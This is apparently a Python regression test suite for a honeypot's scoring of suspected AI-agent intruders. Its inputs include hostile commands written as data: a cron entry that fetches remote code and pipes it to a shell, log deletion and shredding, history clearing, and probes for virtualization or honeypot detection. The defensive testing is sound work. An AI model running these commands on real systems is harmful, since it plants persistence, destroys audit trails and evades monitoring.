#!/usr/bin/env python3
"""test_ai_detector.py — regression tests for the AI-agent tracker signals.

Signals 1-3 (tripwire obedience, machine rhythm, exhaustive enumeration)
predate this file. Signals 4-7 are the Sept 2026 agentic-campaign work
orders: persistence writes, anti-forensics, long-dwell, counter-deception.

Run: python3 test_ai_detector.py   (exit 0 = all green)
"""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import honeypot  # noqa: E402  (imports are side-effect free; guarded __main__)

PASS, FAIL = 0, 0
FAILURES = []


def fresh(sid):
    # Full wipe: sessions persist in _BEHAVIOR across tests in one process,
    # and the swarm signal (8) correlates across sessions — a leftover
    # session could haunt a later test. Each test starts with a clean room.
    honeypot._BEHAVIOR.clear()
    return sid


def wipe():
    honeypot._BEHAVIOR.clear()


def feed(sid, *cmds):
    hit = None
    for c in cmds:
        r = honeypot._track_command(sid, c)
        if r:
            hit = r
    return hit


def backdate(sid, seconds_ago, spread=100):
    """Spread this session's commands over the past `seconds_ago` seconds."""
    b = honeypot._BEHAVIOR[sid]
    t0 = time.time() - seconds_ago
    n = len(b["cmds"])
    b["cmds"] = [(t0 + i * spread, cmd) for i, (_, cmd) in enumerate(b["cmds"])]
    b["started"] = t0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("  ok  %s" % name)
    else:
        FAIL += 1
        FAILURES.append(name)
        print("  FAIL %s %s" % (name, detail))


# --- Signal 4: persistence writes ---------------------------------------
s = fresh("t-persist")
hit = feed(s, "echo '* * * * * curl http://203.0.113.9/x|sh' > /etc/cron.d/syscheck")
b = honeypot._BEHAVIOR[s]
check("persistence write scores +3, no instant fire",
      hit is None and b["score"] == 3
      and any("persistence" in r for r in b["reasons"]),
      "score=%s reasons=%s hit=%s" % (b["score"], b["reasons"], hit))

for benign, sidn in (("cat /etc/crontab", "t-persist-r1"),
                     ("crontab -l", "t-persist-r2"),
                     ("ls -la /etc/cron.d/", "t-persist-r3"),
                     ("echo hello > /tmp/note.txt", "t-persist-r4")):
    s = fresh(sidn)
    feed(s, benign)
    check("persistence read/innocent write silent: %r" % benign,
          honeypot._BEHAVIOR[s]["score"] == 0,
          "score=%s" % honeypot._BEHAVIOR[s]["score"])

# persistence (3) + long-dwell (2) = 5 -> fires
# (rhythm may also contribute from seeding; the assertion is on the two
# reasons that must be present, not the exact total)
s = fresh("t-persist-dwell")
feed(s, *["ls /var/tmp/d%d" % i for i in range(11)])
backdate(s, 1200)
hit = feed(s, "echo '* * * * * id' > /etc/cron.d/a")
check("persistence + dwell crosses threshold",
      hit is not None and "AI_AGENT_DETECTED" in hit
      and "persistence" in hit and "long-dwell" in hit,
      "hit=%s" % hit)

# --- Signal 5: anti-forensics --------------------------------------------
for evil, sidn in (("rm -rf /var/log/*", "t-wipe-1"),
                   ("shred -u /var/log/auth.log", "t-wipe-2"),
                   ("history -c", "t-wipe-3"),
                   ("echo owned > /var/log/auth.log", "t-wipe-4")):
    s = fresh(sidn)
    hit = feed(s, evil)
    b = honeypot._BEHAVIOR[s]
    check("anti-forensics scores +3: %r" % evil,
          hit is None and b["score"] == 3
          and any("anti-forensics" in r for r in b["reasons"]),
          "score=%s hit=%s" % (b["score"], hit))

s = fresh("t-wipe-benign")
feed(s, "rm -rf /tmp/scratch")
check("innocent rm stays silent",
      honeypot._BEHAVIOR[s]["score"] == 0)

# --- Signal 6: long dwell --------------------------------------------------
s = fresh("t-dwell")
feed(s, *["ls /var/tmp/d%d" % i for i in range(12)])
backdate(s, 1200)
hit = feed(s, "pwd")
check("long-dwell session fires with reason",
      hit is not None and "long-dwell" in hit, "hit=%s" % hit)

s = fresh("t-dwell-short")
feed(s, *["ls /var/tmp/d%d" % i for i in range(12)])
hit = feed(s, "pwd")  # seconds-old session: no dwell
b = honeypot._BEHAVIOR[s]
check("short session gets no dwell signal",
      not any("long-dwell" in r for r in b["reasons"]),
      "reasons=%s" % b["reasons"])

# --- Signal 7: counter-deception (above the wave) -------------------------
for probe, sidn in (("systemd-detect-virt", "t-snoop-1"),
                    ("env | grep -i honeypot", "t-snoop-2"),
                    ("dmidecode | grep -i vmware", "t-snoop-3")):
    s = fresh(sidn)
    feed(s, probe)
    b = honeypot._BEHAVIOR[s]
    check("counter-deception probe scores +2: %r" % probe,
          b["score"] == 2 and any("counter-deception" in r
                                  for r in b["reasons"]),
          "score=%s" % b["score"])

# --- Signal 8: swarm coordination (above the wave) ---------------------------
_PLAYBOOK = ["whoami", "id", "uname -a", "ls /tmp", "cat /etc/passwd",
             "ls /var/tmp", "pwd", "env"]
_OTHER_PLAYBOOK = ["ls", "ps aux", "netstat -tulpn", "cat /proc/cpuinfo",
                   "df -h", "ss -tlnp", "top -bn1", "history"]

wipe()
feed("t-swarm-a", *_PLAYBOOK)
feed("t-swarm-b", *_PLAYBOOK)
_b2 = honeypot._BEHAVIOR["t-swarm-b"]
check("swarm coordination detected across matching sessions",
      any("swarm coordination" in r for r in _b2["reasons"]),
      "reasons=%s" % _b2["reasons"])
check("first session carries no swarm reason",
      not any("swarm" in r
              for r in honeypot._BEHAVIOR["t-swarm-a"]["reasons"]))

wipe()
feed("t-swarm-c", *_PLAYBOOK)
honeypot._BEHAVIOR["t-swarm-c"]["started"] = time.time() - 7200  # 2h stale
feed("t-swarm-d", *_PLAYBOOK)
check("stale sessions do not swarm-match",
      not any("swarm" in r
              for r in honeypot._BEHAVIOR["t-swarm-d"]["reasons"]))

wipe()
feed("t-swarm-e", *_PLAYBOOK)
feed("t-swarm-f", *_OTHER_PLAYBOOK)
check("different playbooks do not swarm-match",
      not any("swarm" in r
              for r in honeypot._BEHAVIOR["t-swarm-f"]["reasons"]))

# --- Threshold math & old signals still intact ------------------------------
s = fresh("t-tripwire")
hit = feed(s, "echo done > /opt/agent_audit_log")
check("tripwire obedience still instant-fires",
      hit is not None and "AI_AGENT_DETECTED" in hit, "hit=%s" % hit)

s = fresh("t-combo")
feed(s, "rm -rf /var/log/*")            # +3 anti-forensics
hit = feed(s, *["id", "whoami", "pwd", "ls", "uname", "id",
                "whoami", "pwd"])        # machine rhythm +2 -> 5
check("anti-forensics + rhythm crosses threshold",
      hit is not None and "anti-forensics" in hit, "hit=%s" % hit)

s = fresh("t-benign")
feed(s, "ls /tmp", "cat /etc/passwd", "echo hello", "whoami", "pwd")
check("benign session scores zero",
      honeypot._BEHAVIOR[s]["score"] == 0,
      "score=%s" % honeypot._BEHAVIOR[s]["score"])

s = fresh("t-noraise")
try:
    feed(s, "", "\x00\xff", "   ", "sudo " * 50)
    check("garbage input never raises", True)
except Exception as e:  # noqa: BLE001
    check("garbage input never raises", False, "raised %r" % e)

print("\n%d passed, %d failed" % (PASS, FAIL))
sys.exit(1 if FAIL else 0)
